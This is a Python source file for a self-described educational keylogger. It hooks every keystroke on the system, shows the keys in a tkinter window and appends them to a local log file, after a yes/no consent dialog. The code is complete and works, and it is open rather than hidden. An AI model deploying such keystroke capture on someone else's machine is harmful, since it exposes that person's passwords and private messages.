# --- IMPORTS ---
import keyboard              # lets us capture keyboard input globally
import time                  # used for timing things, like intervals
from datetime import datetime  # to add dates/times to the log
import threading             # lets us run the logger in the background so the window doesn’t freeze
import tkinter as tk         # tkinter is the standard GUI library in Python
from tkinter import messagebox  # for pop-up boxes (like disclaimers and alerts)


# --- CLASS: Keylogger bit ---
class EthicalKeylogger:
    def __init__(self, log_file="keylog.txt", report_interval=60, gui_callback=None):
        """
        This sets up the keylogger:
        - log_file: where the keys get saved
        - report_interval: how often it writes to file
        - gui_callback: a function that updates the window whenever a key is pressed
        """
        self.log_file = log_file
        self.report_interval = report_interval
        self.start_time = time.time()   # keep track of when we last wrote to file
        self.log = ""                   # store the keys here before saving them
        self.running = False            # tells us if the logger is on or off
        self.gui_callback = gui_callback

        # when a session starts, add a header in the log file with the time
        with open(self.log_file, "a") as f:
            f.write(f"\n\n=== Keylogger Session Started: {datetime.now()} ===\n")

    def callback(self, event):
        """
        This runs every time a key is released.
        It cleans up the key name and adds it to the log.
        """
        key = event.name

        # deal with awkward keys that don’t look nice as text
        if len(key) > 1:
            if key == "space":
                key = " "
            elif key == "enter":
                key = "[ENTER]\n"
            elif key == "decimal":
                key = "."
            else:
                key = f"[{key.upper()}]"  # eg [SHIFT], [CTRL]

        self.log += key  # add the key to the log

        # update the GUI live if the window is running
        if self.gui_callback:
            self.gui_callback(key)

        # if enough time has gone by, save what we’ve got to file
        if time.time() - self.start_time > self.report_interval:
            self.write_to_file()

    def write_to_file(self):
        """actually writes the collected keys into the text file"""
        with open(self.log_file, "a") as f:
            f.write(self.log)
        self.log = ""  # clear the memory log
        self.start_time = time.time()  # reset timer

    def start(self):
        """turns the keylogger on and keeps it running"""
        self.running = True
        keyboard.on_release(callback=self.callback)  # capture keys when they’re released

        while self.running:  # loop keeps it going until stop() is called
            time.sleep(0.1)

    def stop(self):
        """turns the keylogger off and saves whatever’s left"""
        self.running = False
        keyboard.unhook_all()  # remove all the keyboard hooks
        if self.log:
            self.write_to_file()


# --- CLASS: GUI bit ---
class KeyloggerGUI:
    def __init__(self, root):
        """
        This sets up the tkinter window.
        root is the main window object.
        """
        self.root = root
        self.root.title("Ethical Keylogger (Educational)")  # title bar text
        self.root.geometry("600x400")  # size of the window

        # text box to show what keys have been pressed
        self.text_area = tk.Text(root, wrap="word", height=15, state="disabled")
        self.text_area.pack(padx=10, pady=10, fill="both", expand=True)

        # start button (green)
        self.start_button = tk.Button(root, text="Start Logging",
                                      command=self.start_logger,
                                      bg="green", fg="white")
        self.start_button.pack(side="left", padx=20, pady=10)

        # stop button (red, disabled to begin with)
        self.stop_button = tk.Button(root, text="Stop Logging",
                                     command=self.stop_logger,
                                     bg="red", fg="white", state="disabled")
        self.stop_button.pack(side="right", padx=20, pady=10)

        # these will hold the keylogger instance and its background thread
        self.keylogger = None
        self.thread = None

    def update_log_display(self, key):
        """puts the captured keys into the text box on the window"""
        self.text_area.config(state="normal")  # unlock the box
        self.text_area.insert("end", key)      # add the new key
        self.text_area.see("end")              # scroll to bottom
        self.text_area.config(state="disabled")  # lock the box again

    def start_logger(self):
        """asks the user for consent then starts the keylogger"""
        consent = messagebox.askyesno("Disclaimer",
                                      "This keylogger is for EDUCATIONAL purposes only.\n"
                                      "Do you agree to use it ethically?")
        if not consent:
            return

        # start the keylogger in a background thread
        self.keylogger = EthicalKeylogger(gui_callback=self.update_log_display)
        self.thread = threading.Thread(target=self.keylogger.start, daemon=True)
        self.thread.start()

        # disable start button and enable stop button
        self.start_button.config(state="disabled")
        self.stop_button.config(state="normal")

    def stop_logger(self):
        """stops the keylogger and resets buttons"""
        if self.keylogger:
            self.keylogger.stop()
            self.keylogger = None

        self.start_button.config(state="normal")
        self.stop_button.config(state="disabled")

        messagebox.showinfo("Stopped", "Keylogger stopped. Logs saved to file.")


# --- MAIN BIT ---
if __name__ == "__main__":
    root = tk.Tk()           # make the main window
    app = KeyloggerGUI(root) # build our GUI inside it
    root.mainloop()          # keeps the window running until closed
